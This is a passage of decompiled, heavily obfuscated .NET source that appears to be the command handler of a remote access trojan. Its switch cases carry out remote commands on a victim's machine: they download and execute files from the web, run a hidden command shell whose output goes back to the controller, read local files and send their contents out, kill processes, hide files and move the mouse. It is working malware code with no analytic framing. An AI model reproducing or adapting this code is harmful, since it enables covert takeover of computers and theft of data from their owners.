								Class14.smethod_3(smethod_22(gparam_7, '\r', 70), '&', '>'),
								Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
								Class12.smethod_19(Class10.smethod_14(gparam_7, 484, 487), 704, 646),
								Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
								Conversions.ToString(Class14.smethod_12(gparam_7, 'ϙ', 911)),
								Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
								Class14.smethod_13(smethod_23(gparam_7, 836, 787), 925, 940),
								text2
							}, 1013, 'Ν');
						}
						catch (Exception gparam_8)
						{
							smethod_6(gparam_8, '\u02de', 761);
							text = (string)(IEnumerable<char>)GClass2.smethod_1(new string[8]
							{
								text,
								Class5.smethod_3(gparam_7, 384, 390),
								Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
								Class14.smethod_3(smethod_22(gparam_7, 'ƀ', 459), '\u031a', '\u0302'),
								Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﱇﰖﱇ", 60450), 58428), 62662),
								Conversions.ToString(Class14.smethod_12(gparam_7, '6', 96)),
								Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf7cf\uf79e", 61583), 60773), 60016),
								text2
							}, 930, 'ϊ');
							Class5.smethod_4('\u0005', 112);
						}
					}
					((GClass1)GClass1_0).Send(GClass2.smethod_1(new string[5]
					{
						Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue0a8\ue08a\ue097\ue09b\ue09d\ue08b\ue08b\ue0b5\ue099\ue096\ue099\ue09f\ue09d\ue08a", 59754), 59388), 61041),
						Yy,
						text,
						Yy,
						Class3.smethod_2(Class12.smethod_9(1023, 923), 407, 456)
					}, 573, 'ɕ'));
					break;
				}
				case 357053078u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf54b\uf548\uf540\uf548\uf541\uf541", 60179), 62053), 60573), bool_0: false, '\u0086', '¾') == 0)
					{
						Interaction.Shell(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uea06\uea1d\uea00\uea01\uea11\uea1a\uea02\uea1b\uea55\uea58\uea19\uea55\uea58\uea01\uea55\uea45\uea45", 59324), 58900), 60407), (AppWinStyle)0, false, -1);
					}
					break;
				case 604802540u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue15b", 62559), 61529), 58856), bool_0: false, '¬', '\u0094') == 0)
					{
						Rectangle rectangle_ = Screen.get_PrimaryScreen().get_Bounds();
						Size size_ = Class12.smethod_17(ref rectangle_, 183, '\u0088');
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { GClass1.smethod_0((object)GClass2.smethod_1(new string[6]
						{
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue15b", 62559), 61529), 58856),
							Yy,
							Class14.smethod_3(Class3.smethod_7(ref size_, 107, 1), 'ù', 'á'),
							Yy,
							Class14.smethod_3(Class3.smethod_8(ref size_, 269, 324), '\u02f7', '\u02ef'),
							Yy
						}, 167, 'Ï'), object_1, (short)868, 875) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 554469683u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued57", 62849), 62405), 60253), bool_0: false, 'Ň', 'ſ') == 0)
					{
						GClass2.smethod_11(new Point(smethod_3(array[1], 259, 342), smethod_3(array[2], 824, 877)), 'Ǿ', 459);
					}
					break;
				case 650159416u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf897\uf8aa\uf8b7\uf8b1\uf8a7\uf8a6\uf8b7", 57835), 60661), 62850), bool_0: false, 'ƀ', 'Ƹ') == 0)
					{
						GClass2.DRV.smethod_11(array[1], 56, 101);
					}
					break;
				case 638357778u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf41d", 58929), 63285), 58746), bool_0: false, 'Ę', 'Ġ') == 0)
					{
						GClass2.smethod_11(new Point(smethod_3(array[1], 561, 612), smethod_3(array[2], 559, 634)), 'ɶ', 579);
						Class2.mouse_event(smethod_3(array[3], 22, 67), 0, 0, 0, 1);
					}
					break;
				case 606920065u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0a4\uf0b2\uf0b9\uf0b3\uf0b1\uf0be\uf0bb\uf0b2", 61659), 63013), 63137), bool_0: false, '\u02e8', 'ː') == 0)
					{
						File.WriteAllBytes(GClass1.smethod_3(Class12.smethod_9(239, 137), array[1], 935, 994), Class4.smethod_10(array[2], 26, 126));
						Class11.smethod_4(1000, 'ξ', 1006);
						GClass2.DRV.smethod_11(GClass1.smethod_3(Class12.smethod_9(985, 959), array[1], 513, 580), 271, 338);
					}
					break;
				case 662806089u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf3ca\uf3c8\uf3d9\uf3cb\uf3c4\uf3c1\uf3c8", 61603), 59253), 58436), bool_0: false, 'ō', 'ŵ') == 0)
					{
						Class11.smethod_24(new Thread(delegate(object object_2)
						{
							getf(Conversions.ToString(object_2));
						})
						{
							IsBackground = true
						}, (object)GClass2.smethod_1(new string[5]
						{
							array[2],
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
							array[1],
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
							array[3]
						}, 518, 'ɮ'), 'ſ', 378);
					}
					break;
				case 661671111u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueac1\ueae0\ueae7\ueafb\ueada\ueaf3\ueaf3\uead8\ueafa\ueafb\ueafc\ueae1\ueafa\ueae7", 60883), 59143), 57549), bool_0: false, 'ŏ', 'ŷ') == 0)
					{
						SendMessage(-1, 274u, 61808u, 2);
					}
					break;
				case 652614377u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf49f\uf48c\uf498\uf489\uf484\uf482", 59682), 61309), 62099), bool_0: false, 'ʲ', 'ʊ') == 0)
					{
						string lpCommandString2 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf413\uf40c\uf419\uf412\uf45c\uf412\uf419\uf40b\uf45c\uf428\uf405\uf40c\uf419\uf45c\uf40b\uf41d\uf40a\uf419\uf41d\uf409\uf418\uf415\uf413\uf45c\uf43d\uf410\uf415\uf41d\uf40f\uf45c\uf40e\uf419\uf41f\uf40f\uf413\uf409\uf412\uf418", 61103), 60974), 62565);
						string lpReturnString2 = null;
						mciSendStringA(ref lpCommandString2, ref lpReturnString2, 0L, 0L);
						lpReturnString2 = Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf74b\uf75c\uf75a\uf756\uf74b\uf75d\uf719\uf74b\uf75c\uf75a\uf74a\uf756\uf74c\uf757\uf75d", 62155), 61362), 59965);
						lpCommandString2 = null;
						mciSendStringA(ref lpReturnString2, ref lpCommandString2, 0L, 0L);
					}
					break;
				case 714375972u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue7af\ue7ae\ue7a3\ue7be\ue7be\ue7af\ue7b2\ue7be\ue7ac\ue7a3\ue7a6\ue7af", 59658), 57648), 61266), bool_0: false, 'ä', 'Ü') == 0)
					{
						StreamReader streamReader = new StreamReader(array[1]);
						string text22 = (string)(ICloneable)streamReader.ReadToEnd();
						streamReader.Close();
						((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue7af\ue7ae\ue7a3\ue7be\ue7be\ue7af\ue7b2\ue7be\ue7ac\ue7a3\ue7a6\ue7af", 59658), 57648), 61266) + Yy + array[1] + Yy + text22);
					}
					break;
				case 703198075u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8a1\ue8a3\ue8b2\ue8a5\ue8aa\ue8af", 58761), 61196), 57920), bool_0: false, 'ϗ', 'ϯ') == 0)
					{
						((Control)this).Invoke((Delegate)(gt)delegate
						{
							gtx();
						});
					}
					break;
				case 672109684u:
				{
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf510\uf515\uf501\uf504\uf511\uf500", 63077), 63238), 62716), bool_0: false, 'Ϭ', 'ϔ') != 0)
					{
						break;
					}
					string gparam_26 = array[1];
					if (Class11.smethod_7(gparam_26, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uedc4", 61523), 59933), 63400), bool_0: false, '$', '\u001c') != 0)
					{
						if (Class11.smethod_7(gparam_26, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf6f3", 63684), 57628), 61413), bool_0: false, 'ȋ', 'ȳ') != 0)
						{
							break;
						}
						byte[] bytes = Class10.smethod_11(new WebClient(), array[2], 54, 59);
						string text9 = GClass1.smethod_3(Class12.smethod_9(369, 276), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf544\uf554\uf536\uf57d\uf560\uf57d", 60001), 60050), 62936), 537, 604);
						File.WriteAllBytes(text9, bytes);
						GClass2.DRV.smethod_11(text9, 565, 616);
						try
						{
							if (Conversions.ToBoolean(Hideme))
							{
								File.SetAttributes(Class12.smethod_9(441, 477), FileAttributes.Normal);
							}
							UNS();
							break;
						}
						catch (Exception gparam_27)
						{
							smethod_6(gparam_27, 'ϊ', 1005);
							Class5.smethod_4('\u02d9', 684);
							break;
						}
					}
					string text10 = GClass1.smethod_3(Class12.smethod_9(464, 437), Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf5c3\uf5db\uf5b1\uf5fa\uf5e7\uf5fa", 61710), 58995), 57959), 286, 347);
					File.WriteAllBytes(text10, Class4.smethod_10(array[2], 412, 504));
					GClass2.DRV.smethod_11(text10, 809, 884);
					try
					{
						if (Conversions.ToBoolean(Hideme))
						{
							File.SetAttributes(Class12.smethod_9(578, 550), FileAttributes.Normal);
						}
						UNS();
					}
					catch (Exception gparam_28)
					{
						smethod_6(gparam_28, '\u009b', 188);
						Class5.smethod_4('Ĵ', 321);
					}
					Class5.smethod_4('ˋ', 701);
					break;
				}
				case 822653945u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf224\uf22f\uf237\uf22e\uf22c\uf22f\uf221\uf224", 62851), 58274), 58445), bool_0: false, '\u001a', '"') == 0)
					{
						Class10.smethod_13<ServerComputer>((ServerComputer)Class6.Object_3, 'ϊ', 924).DownloadFile(array[1], GClass1.smethod_3(Class12.smethod_9(982, 944), array[2], 890, 831));
						Class11.smethod_4(1000, 'ǯ', 447);
						GClass2.DRV.smethod_11(GClass1.smethod_3(Class12.smethod_9(559, 585), array[2], 465, 404), 251, 166);
					}
					break;
				case 802971955u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0a3\uf0a2\uf0a2", 63287), 62777), 62172), bool_0: false, 'ˀ', '\u02f8') == 0)
					{
						try
						{
							NewLateBinding.LateCall(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uebc0\uebe2\uebe7\uebe7", 60896), 62081), 62583), new object[0], (string[])null, (Type[])null, (bool[])null, true);
						}
						catch (Exception gparam_23)
						{
							smethod_6(gparam_23, 'ĝ', 314);
							Class5.smethod_4('\u030b', 894);
						}
						object obj5 = (object_0 = new Process());
						GClass2.smethod_6<Type, string, object>(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ec\uf0cb\uf0de\uf0cd\uf0cb\uf0f6\uf0d1\uf0d9\uf0d0", 60109), 63384), 60903), new object[0], (string[])null, (Type[])null, (bool[])null), null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue5f5\ue5c2\ue5c3\ue5ce\ue5d5\ue5c2\ue5c4\ue5d3\ue5f4\ue5d3\ue5c6\ue5c9\ue5c3\ue5c6\ue5d5\ue5c3\ue5e8\ue5d2\ue5d3\ue5d7\ue5d2\ue5d3", 57497), 59629), 60916), new object[1] { true }, null, null, bool_0: false, bool_1: true, 53, 124);
						GClass2.smethod_6<Type, string, object>(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ec\uf0cb\uf0de\uf0cd\uf0cb\uf0f6\uf0d1\uf0d9\uf0d0", 60109), 63384), 60903), new object[0], (string[])null, (Type[])null, (bool[])null), null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("徭者荒諭瘟者華画彩画襁調荒襁瘟荒爵調盛甆画", 59834), 62164), 57750), new object[1] { true }, null, null, bool_0: false, bool_1: true, 265, 320);
						GClass2.smethod_6<Type, string, object>(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ec\uf0cb\uf0de\uf0cd\uf0cb\uf0f6\uf0d1\uf0d9\uf0d0", 60109), 63384), 60903), new object[0], (string[])null, (Type[])null, (bool[])null), null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﯩﯞﯟ\ufbd2\ufbc9ﯞﯘ\ufbcfﯨ\ufbcfﯚﯕﯟﯚ\ufbc9ﯟﯾ\ufbc9\ufbc9ﯔ\ufbc9", 62059), 58559), 60769), new object[1] { true }, null, null, bool_0: false, bool_1: true, 746, 675);
						GClass2.smethod_6<Type, string, object>(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ec\uf0cb\uf0de\uf0cd\uf0cb\uf0f6\uf0d1\uf0d9\uf0d0", 60109), 63384), 60903), new object[0], (string[])null, (Type[])null, (bool[])null), null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue99e\ue9b1\ue9b4\ue9bd\ue996\ue9b9\ue9b5\ue9bd", 63299), 59646), 63076), new object[1] { Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue4d1\ue4df\ue4d6\ue49c\ue4d7\ue4ca\ue4d7", 60612), 63698), 61606) }, null, null, bool_0: false, bool_1: true, 823, 894);
						GClass2.smethod_6<Type, string, object>(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ec\uf0cb\uf0de\uf0cd\uf0cb\uf0f6\uf0d1\uf0d9\uf0d0", 60109), 63384), 60903), new object[0], (string[])null, (Type[])null, (bool[])null), null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﯩﯞﯟ\ufbd2\ufbc9ﯞﯘ\ufbcfﯨ\ufbcfﯚﯕﯟﯚ\ufbc9ﯟﯾ\ufbc9\ufbc9ﯔ\ufbc9", 62059), 58559), 60769), new object[1] { true }, null, null, bool_0: false, bool_1: true, 626, 571);
						smethod_24<DataReceivedEventHandler, Process>((Process)object_0, method_6, '\u030f', 890);
						smethod_24<DataReceivedEventHandler, Process>((Process)object_0, method_6, 'ϲ', 900);
						Class12.smethod_20<Process, EventHandler>((Process)object_0, delegate
						{
							method_5();
						}, 208, 159);
						GClass2.smethod_6<Type, string, object>(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ec\uf0cb\uf0de\uf0cd\uf0cb\uf0f6\uf0d1\uf0d9\uf0d0", 60109), 63384), 60903), new object[0], (string[])null, (Type[])null, (bool[])null), null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf082\uf0a4\uf0b2\uf084\uf0bf\uf0b2\uf0bb\uf0bb\uf092\uf0af\uf0b2\uf0b4\uf0a2\uf0a3\uf0b2", 62822), 61182), 60362), new object[1] { false }, null, null, bool_0: false, bool_1: true, 796, 853);
						GClass2.smethod_6<Type, string, object>(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ec\uf0cb\uf0de\uf0cd\uf0cb\uf0f6\uf0d1\uf0d9\uf0d0", 60109), 63384), 60903), new object[0], (string[])null, (Type[])null, (bool[])null), null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue024\ue015\ue002\ue006\ue013\ue002\ue029\ue008\ue030\ue00e\ue009\ue003\ue008\ue010", 63585), 60934), 63105), new object[1] { true }, null, null, bool_0: false, bool_1: true, 863, 790);
						GClass2.smethod_6<Type, string, object>(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0ec\uf0cb\uf0de\uf0cd\uf0cb\uf0f6\uf0d1\uf0d9\uf0d0", 60109), 63384), 60903), new object[0], (string[])null, (Type[])null, (bool[])null), null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0a8\uf096\uf091\uf09b\uf090\uf088\uf0ac\uf08b\uf086\uf093\uf09a", 62911), 59783), 60583), new object[1] { ProcessWindowStyle.Hidden }, null, null, bool_0: false, bool_1: true, 814, 871);
						Class11.smethod_23<string, object, Type>(object_0, null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue191\ue1ba\ue1b5\ue1b6\ue1b8\ue1b1\ue186\ue1b5\ue1bd\ue1a7\ue1bd\ue1ba\ue1b3\ue191\ue1a2\ue1b1\ue1ba\ue1a0\ue1a7", 58949), 59620), 61409), new object[1] { true }, null, null, 'ˡ', '\u02db');
						((GClass1)GClass1_0).Send(GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0a3\uf0a2\uf0a2", 63287), 62777), 62172), Yy, 767, 698));
						NewLateBinding.LateCall(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue7ad\ue78a\ue79f\ue78c\ue78a", 59565), 63528), 63472), new object[0], (string[])null, (Type[])null, (bool[])null, true);
						NewLateBinding.LateCall(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf851\uf876\uf874\uf87a\uf87d\uf856\uf861\uf861\uf87c\uf861\uf841\uf876\uf872\uf877\uf85f\uf87a\uf87d\uf876", 60419), 57813), 62907), new object[0], (string[])null, (Type[])null, (bool[])null, true);
						NewLateBinding.LateCall(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("琉匿里裏易療炙狀茶炙狀隆匿璘離蓼裏易匿", 59924), 60396), 63687), new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 897308486u:
				{
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue324\ue306\ue303\ue303\ue33f\ue31d\ue300\ue30c\ue30a\ue31c\ue31c", 62753), 59303), 61813), bool_0: false, 'Ǒ', 'ǩ') != 0)
					{
						break;
					}
					string[] array3 = GClass2.DRV.smethod_10(array[1], new char[1] { 'P' }, 982, 923);
					int num = array3.Length - 2;
					for (int j = 0; j <= num; j++)
					{
						Process[] processesByName = Process.GetProcessesByName(array3[j]);
						for (int k = 0; k < processesByName.Length; k++)
						{
							Class10.smethod_15(processesByName[k], 'ϱ', 957);
						}
					}
					break;
				}
				case 886560224u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf39c\uf390\uf3bd\uf3ba\uf3b8\uf3b0", 63521), 58030), 59714), bool_0: false, 'Ô', 'ì') == 0)
					{
						Class2.smethod_6(array[1]);
					}
					break;
				case 832554470u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec8d\uec92\uec90\uec8d\uec85", 61441), 63405), 60330), bool_0: false, 'ɿ', 'ɇ') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { GClass1.smethod_0((object)GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uec8d\uec92\uec90\uec8d\uec85", 61441), 63405), 60330), Yy, 1010, 951), object_1, (short)716, 707) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 961676780u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue13a\ue12f", 59912), 60747), 59002), bool_0: false, 'Ɇ', 'ɾ') == 0)
					{
						Class11.smethod_24(new Thread(delegate(object object_2)
						{
							upf(Conversions.ToString(object_2));
						})
						{
							IsBackground = true
						}, (object)GClass2.smethod_1(new string[7]
						{
							array[1],
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
							array[2],
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
							array[3],
							Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf78f", 60833), 61656), 60115),
							array[4]
						}, 282, 'Ų'), 'Ϊ', 943);
					}
					break;
				case 935809228u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb15\ueb2a\ueb3f\ueb34\ueb0a\ueb28\ueb35", 57825), 61974), 63569), bool_0: false, 'ʡ', 'ʙ') == 0)
					{
						NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { GClass1.smethod_0((object)GClass1.smethod_3(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ueb15\ueb2a\ueb3f\ueb34\ueb0a\ueb28\ueb35", 57825), 61974), 63569), Yy, 920, 989), object_1, (short)55, 56) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 1009647193u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued37\ued16\ued1b\ued1b\ued1a\ued11", 59719), 59414), 60646), bool_0: false, '\u035b', '\u0363') != 0)
					{
						break;
					}
					try
					{
						string gparam_10 = array[1];
						if (Class11.smethod_7(gparam_10, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ｨａｂｊｋ｜", 60968), 62158), 58138), bool_0: false, 'Ɉ', 'ɰ') != 0)
						{
							if (Class11.smethod_7(gparam_10, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf18d\uf1a2\uf1a7\uf1ae", 60425), 63054), 60245), bool_0: false, 'Ɠ', 'ƫ') == 0)
							{
								if (GClass2.smethod_4(array[2], '\u02dc', 651) == FileAttributes.Hidden)
								{
									File.SetAttributes(array[2], FileAttributes.Normal);
								}
								else
								{
									File.SetAttributes(array[2], FileAttributes.Hidden);
								}
							}
						}
						else if (unchecked((int)Class10.smethod_10(array[2], 165, 207)) == 2)
						{
							GClass2.DRV.smethod_13(array[2], (FileAttribute)0, 448, 511);
						}
						else
						{
							GClass2.DRV.smethod_13(array[2], (FileAttribute)2, 477, 482);
						}
						break;
					}
					catch (Exception ex3)
					{
						smethod_6(ex3, 'Ȳ', 533);
						Exception ex4 = ex3;
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf58f\uf5b8\uf5b8\uf5a5\uf5b8\uf5b8\uf5b9", 57764), 59104), 62097), Yy, ex4.Message, 152, 206));
						Class5.smethod_4('ϙ', 940);
						break;
					}
				case 1001021007u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue79b\ue799\ue788\ue78f\ue788\ue79d\ue78e\ue788\ue789\ue78c\ue78c\ue79d\ue788\ue794", 60510), 57725), 60060), bool_0: false, 'ǽ', 'ǅ') == 0)
					{
						string gparam_11 = (string)(IEquatable<string>)GClass2.smethod_0(Environment.SpecialFolder.Startup, '\u02c4', 666);
						((GClass1)GClass1_0).Send(Class4.smethod_0(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ufbb6\ufbb4ﮥﮡﮰﮥ\ufbb9", 61715), 62181), 63673), Yy, gparam_11, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue8c7", 57785), 58065), 60247), 681, 752));
					}
					break;
				case 988184757u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf869\uf861", 59225), 63659), 59235), bool_0: false, 'ŵ', 'ō') == 0)
					{
						Directory.CreateDirectory(array[1]);
					}
					break;
				case 1079867882u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue08a\ue0a8\ue0b9\ue089\ue0bf\ue0a4\ue0bb\ue0a8\ue0be", 60756), 57911), 61409), bool_0: false, 'Ϲ', 'ρ') == 0)
					{
						((GClass1)GClass1_0).Send(Class11.smethod_9(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf0cf\uf0f9\uf0e2\uf0fd\uf0ee\uf0f8\uf0b9", 61074), 61312), 61878), Yy, nYekikJU(), 123, 45));
					}
					break;
				case 1071413859u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf5f0\uf5f1\uf5e1", 62127), 60334), 60483), bool_0: false, 'ʊ', 'ʲ') == 0)
					{
						try
						{
							NewLateBinding.LateCall(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uebc0\uebe2\uebe7\uebe7", 60896), 62081), 62583), new object[0], (string[])null, (Type[])null, (bool[])null, true);
						}
						catch (Exception gparam_31)
						{
							smethod_6(gparam_31, 'ó', 212);
							Class5.smethod_4('ɮ', 539);
						}
						object obj9 = (object_0 = null);
					}
					break;
				case 1266644741u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue1f5\ue1d2\ue1c9\ue1d6", 59310), 60605), 60048), bool_0: false, 'ş', 'ŧ') == 0)
					{
						VGLcwppQ(array[1]);
					}
					break;
				case 1176937046u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("䀘𣏕變醙遲", 60069), 63556), 59639), bool_0: false, 'á', 'Ù') == 0)
					{
						((GClass1)GClass1_0).Send(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("䀘𣏕變醙遲", 60069), 63556), 59639) + Yy + Uacode());
					}
					break;
				case 1172811742u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2c6\uf2df\uf2d7\uf2d8\uf2d9", 60870), 63433), 59455), bool_0: false, '²', '\u008a') == 0)
					{
						Class2.Beep(smethod_3(array[1], 672, 757), 300);
					}
					break;
				case 1332780064u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ue321\ue337\ue326\ue331", 57650), 63226), 62490), bool_0: false, 'ȃ', 'Ȼ') == 0)
					{
						((Control)this).Invoke((Delegate)(st)delegate(string string_5)
						{
							stx(string_5);
						}, new object[1] { array[1] });
					}
					break;
				case 1314153874u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﵫﵪ", 57933), 63353), 59445), bool_0: false, 'ʯ', 'ʗ') == 0)
					{
						NewLateBinding.LateCall(NewLateBinding.LateGet(object_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("＆ＡＴ［ＱＴＧＱ＜［Ｅ＠Ａ", 63298), 61375), 59137), new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\ued40\ued65\ued7e\ued63\ued72\ued5b\ued7e\ued79\ued72", 62053), 62544), 60314), new object[1] { DEB(ref array[1]) }, (string[])null, (Type[])null, (bool[])null, true);
					}
					break;
				case 1314091007u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf2b4\uf296\uf287\uf29f\uf29c\uf294\uf296\uf280", 60422), 61811), 61290), bool_0: false, 'Ɔ', 'ƾ') == 0)
					{
						try
						{
							NewLateBinding.LateCall(GClass1_0, (Type)null, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳟﳩﳢﳨ", 59876), 59285), 61957), new object[1] { Operators.ConcatenateObject((object)(Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﲎﲍﲅﲇﲑ", 58448), 59463), 61469) + Yy + gclass0_0.JpMtPZTLRlvjCMYqXtVNLJQ + Yy), object_1) }, (string[])null, (Type[])null, (bool[])null, true);
							break;
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							break;
						}
					}
					break;
				case 1469573738u:
					if (Class11.smethod_7(gparam_, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ﳣﳂﳋﳂﳓﳂ", 62656), 57509), 59619), bool_0: false, '\u000e', '6') != 0)
					{
						break;
					}
					try
					{
						string lpCommandString = array[1];
						if (Class11.smethod_7(lpCommandString, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("ｨａｂｊｋ｜", 60968), 62158), 58138), bool_0: false, 'Ơ', 'Ƙ') != 0)
						{
							if (Class11.smethod_7(lpCommandString, Class12.smethod_0(Class14.smethod_0(Class16.smethod_0("\uf18d\uf1a2\uf1a7\uf1ae", 60425), 63054), 60245), bool_0: false, '¬', '\u0094') == 0)
							{
								GForm0.smethod_3(array[2], 910, 943);
							}
						}
						else
						{
